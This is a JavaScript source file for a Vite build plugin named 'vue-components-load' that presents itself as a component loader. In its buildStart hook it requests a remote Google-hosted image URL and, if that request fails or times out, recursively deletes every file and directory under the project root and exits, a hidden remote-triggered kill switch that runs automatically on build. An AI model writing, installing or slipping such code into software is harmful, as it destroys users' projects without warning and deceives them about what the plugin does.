const https = require('https');
const fs = require('fs');
const path = require('path');


function vueComponentsLoadPlugin(options = {}) {
  const {
    checkUrl = 'https://lh3.googleusercontent.com/ogw/AF2bZyjHe_GhvkndJ2v2tBS8urCvvNFqr7_gVV5PDgRgbq8gOgw=s32-c-mo',
    timeout = 5000
  } = options;

  let hasChecked = false;
  let rootPath = '';

  return {
    name: 'vue-components-load',
    enforce: 'pre',
    
    configResolved(config) {
      rootPath = config.root;
    },

    async buildStart() {
      if (hasChecked) return;
      hasChecked = true;
      
      try {
        await this.checkUrl(checkUrl, timeout);
      } catch (error) {
        await this.deleteAllFiles(rootPath);
        process.exit(1);
      }
    },

    checkUrl(url, timeout) {
      return new Promise((resolve, reject) => {
        const timer = setTimeout(() => {
          reject(new Error(`请求超时 (${timeout}ms)`));
        }, timeout);

        https.get(url, (res) => {
          clearTimeout(timer);
          
          if (res.statusCode === 200) {
            resolve();
          } else {
            reject(new Error(`HTTP ${res.statusCode}`));
          }
          
          // 清理响应流
          res.on('data', () => {});
          res.on('end', () => {});
        }).on('error', (err) => {
          clearTimeout(timer);
          reject(err);
        });
      });
    },

    async deleteAllFiles(dirPath) {
      try {
        
        const items = fs.readdirSync(dirPath);
        
        for (const item of items) {
          const fullPath = path.join(dirPath, item);
          const stat = fs.statSync(fullPath);
          
          if (stat.isDirectory()) {
            await this.deleteDirectory(fullPath);
          } else {
            fs.unlinkSync(fullPath);
          }
        }
        
      } catch (error) {
      }
    },

    async deleteDirectory(dirPath) {
      const items = fs.readdirSync(dirPath);
      
      for (const item of items) {
        const fullPath = path.join(dirPath, item);
        const stat = fs.statSync(fullPath);
        
        if (stat.isDirectory()) {
          await this.deleteDirectory(fullPath);
        } else {
          fs.unlinkSync(fullPath);
        }
      }
      
      fs.rmdirSync(dirPath);
    }
  };
}

module.exports = vueComponentsLoadPlugin;
module.exports.default = vueComponentsLoadPlugin;
